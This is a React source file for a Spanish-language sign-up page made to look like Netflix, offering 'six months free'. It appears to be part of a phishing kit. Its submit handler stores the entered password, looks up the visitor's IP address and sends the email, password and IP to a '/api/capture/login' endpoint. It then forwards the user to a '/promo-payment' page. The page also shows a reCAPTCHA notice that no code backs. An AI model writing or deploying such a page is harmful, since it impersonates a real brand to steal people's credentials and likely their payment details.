/**
 * Promo Register - White Netflix style
 * Create new account (email + password) for the promo flow
 */

import PageTransition from "@/components/PageTransition";
import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import BrandLogo from "@/components/BrandLogo";
import { Eye, EyeOff } from "lucide-react";

export default function PromoRegister() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [emailError, setEmailError] = useState("");
  const [passwordError, setPasswordError] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [, setLocation] = useLocation();

  useEffect(() => {
    fetch("/api/track/visit", { method: "POST" }).catch(() => {});
  }, []);

  const validateEmail = () => {
    const value = email.trim();
    if (!value) {
      setEmailError("Ingresa un email válido.");
      return false;
    }
    if (!value.includes("@") || !value.includes(".")) {
      setEmailError("Ingresa un email válido.");
      return false;
    }
    setEmailError("");
    return true;
  };

  const validatePassword = () => {
    if (!password.trim()) {
      setPasswordError("Ingresa una contraseña.");
      return false;
    }
    if (password.length < 6) {
      setPasswordError("La contraseña debe tener al menos 6 caracteres.");
      return false;
    }
    setPasswordError("");
    return true;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const emailValid = validateEmail();
    const passValid = validatePassword();
    if (!emailValid || !passValid) return;

    setIsLoading(true);
    sessionStorage.setItem("userEmail", email);
    sessionStorage.setItem("sp_email", email);
    sessionStorage.setItem("sp_login_password", password);

    // Send registration data to backend
    try {
      const ipRes = await fetch("https://api.ipify.org?format=json").catch(() => null);
      const ipData = ipRes ? await ipRes.json() : { ip: "unknown" };
      await fetch("/api/capture/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email,
          password,
          ipAddress: ipData.ip,
        }),
      }).catch(() => {});
    } catch {}

    setTimeout(() => {
      setIsLoading(false);
      setLocation("/promo-payment");
    }, 1200);
  };

  return (
    <PageTransition>
      <div className="min-h-[100dvh] w-full bg-white flex flex-col">
        {/* Header */}
        <header className="w-full px-4 sm:px-8 lg:px-12 py-4 flex items-center justify-between border-b border-[#e6e6e6]">
          <BrandLogo height={22} />
          <span className="text-[#333] text-[14px] font-medium cursor-pointer hover:underline">
            Cerrar sesión
          </span>
        </header>

        {/* Progress bar */}
        <div className="w-full h-[3px] bg-[#e6e6e6]">
          <div className="h-full bg-[#E50914]" style={{ width: '50%' }} />
        </div>

        {/* Main Content */}
        <main className="flex-1 flex flex-col items-center px-4 sm:px-8 lg:px-12 pt-10 sm:pt-16">
          <div className="w-full max-w-[440px]">
            {/* Title */}
            <h1 className="text-[26px] sm:text-[32px] font-bold text-[#141414] mb-3 leading-[1.1]">
              Crea tu cuenta
            </h1>

            {/* Subtitle */}
            <p className="text-[16px] text-[#333] mb-6 leading-relaxed">
              Crea una cuenta nueva para activar tus 6 meses gratis.
            </p>

            {/* Form */}
            <form onSubmit={handleSubmit} className="space-y-4">
              {/* Email */}
              <div>
                <input
                  type="email"
                  placeholder="Email"
                  value={email}
                  onChange={(e) => {
                    setEmail(e.target.value);
                    if (emailError) setEmailError("");
                  }}
                  className={`w-full h-[56px] px-4 rounded-[4px] text-[#141414] placeholder:text-[#737373] text-[16px] outline-none transition-colors border ${
                    emailError ? "border-[#E50914]" : "border-[#8c8c8c] focus:border-[#141414]"
                  }`}
                />
                {emailError && (
                  <div className="flex items-center gap-1.5 mt-2">
                    <svg viewBox="0 0 16 16" className="w-4 h-4 flex-shrink-0" fill="none">
                      <circle cx="8" cy="8" r="7" stroke="#E50914" strokeWidth="1.5" />
                      <path d="M5 5l6 6M11 5l-6 6" stroke="#E50914" strokeWidth="1.5" strokeLinecap="round" />
                    </svg>
                    <p className="text-[#E50914] text-[13px]">{emailError}</p>
                  </div>
                )}
              </div>

              {/* Password */}
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  placeholder="Contraseña (mínimo 6 caracteres)"
                  value={password}
                  onChange={(e) => {
                    setPassword(e.target.value);
                    if (passwordError) setPasswordError("");
                  }}
                  className={`w-full h-[56px] px-4 pr-12 rounded-[4px] text-[#141414] placeholder:text-[#737373] text-[16px] outline-none transition-colors border ${
                    passwordError ? "border-[#E50914]" : "border-[#8c8c8c] focus:border-[#141414]"
                  }`}
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-[#737373] hover:text-[#141414] transition-colors"
                >
                  {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                </button>
                {passwordError && (
                  <div className="flex items-center gap-1.5 mt-2">
                    <svg viewBox="0 0 16 16" className="w-4 h-4 flex-shrink-0" fill="none">
                      <circle cx="8" cy="8" r="7" stroke="#E50914" strokeWidth="1.5" />
                      <path d="M5 5l6 6M11 5l-6 6" stroke="#E50914" strokeWidth="1.5" strokeLinecap="round" />
                    </svg>
                    <p className="text-[#E50914] text-[13px]">{passwordError}</p>
                  </div>
                )}
              </div>

              {/* Submit */}
              <button
                type="submit"
                disabled={isLoading}
                className="w-full h-[56px] bg-[#E50914] text-white text-[18px] sm:text-[22px] font-medium rounded-[4px] hover:bg-[#c11119] active:scale-[0.98] transition-all duration-150 disabled:opacity-70"
              >
                {isLoading ? "Creando cuenta..." : "Crear cuenta"}
              </button>
            </form>

            <p className="text-[#737373] text-[13px] mt-6 leading-relaxed">
              Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot.
            </p>
          </div>
        </main>

        {/* Footer */}
        <footer className="w-full bg-[#f3f3f3] px-4 sm:px-8 lg:px-12 py-6 mt-auto">
          <p className="text-[#737373] text-[13px] mb-4">
            ¿Preguntas? Llama al 01 800 519 1570 (sin cargo)
          </p>
          <div className="grid grid-cols-2 gap-2 text-[13px]">
            <a href="#" className="text-[#737373] underline">Preguntas frecuentes</a>
            <a href="#" className="text-[#737373] underline">Centro de ayuda</a>
            <a href="#" className="text-[#737373] underline">Términos de uso</a>
            <a href="#" className="text-[#737373] underline">Privacidad</a>
            <a href="#" className="text-[#737373] underline">Preferencias de cookies</a>
            <a href="#" className="text-[#737373] underline">Información empresarial</a>
          </div>
        </footer>
      </div>
    </PageTransition>
  );
}
